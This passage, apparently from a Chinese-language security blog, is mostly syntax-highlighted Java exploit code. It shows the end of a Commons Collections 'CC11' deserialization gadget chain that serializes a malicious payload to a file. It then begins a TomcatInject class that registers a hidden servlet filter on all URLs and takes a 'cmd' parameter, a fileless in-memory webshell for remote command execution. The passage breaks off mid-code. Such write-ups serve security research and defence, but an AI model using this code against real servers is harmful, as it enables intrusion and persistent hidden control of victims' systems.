&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">f2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset_map&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">node&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.util.MapEntry&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">keyField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">node&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">tiedmap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 在 invoke 之后，
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">outputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./cc11Test4.ser&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;E:\\JavaStudy\\test05\\target\\classes\\ccTest\\TomcatInject.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">byteArrayOutputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())!=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">byteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">byteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>有了这个CC11的模板，剩下的就是注入内存马部分了，详细分析可以参见三梦师傅的&lt;a href="https://xz.aliyun.com/t/7388#toc-2">基于tomcat的内存 Webshell 无文件攻击技术&lt;/a>（太强了太强了），代码如下（有稍作修改）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ccTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.DOM&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.TransletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.serializer.SerializationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.catalina.LifecycleState&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.catalina.core.ApplicationContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.catalina.core.StandardContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Modifier&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.Filter&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.FilterChain&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.FilterConfig&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletRequest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletResponse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TomcatInject&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">AbstractTranslet&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Filter&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmdParamName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">filterUrlPattern&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">filterName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 反射修改WRAP_SAME_OBJECT值为true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationDispatcher&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WRAP_SAME_OBJECT&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Field&lt;/span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取modifiers字段
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//将变量设置为可访问
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 取消FINAL属性
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 将变量设置为可访问
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 将变量设置为true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 初始化lastServicedRequest
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.ApplicationFilterChain&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedRequest&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
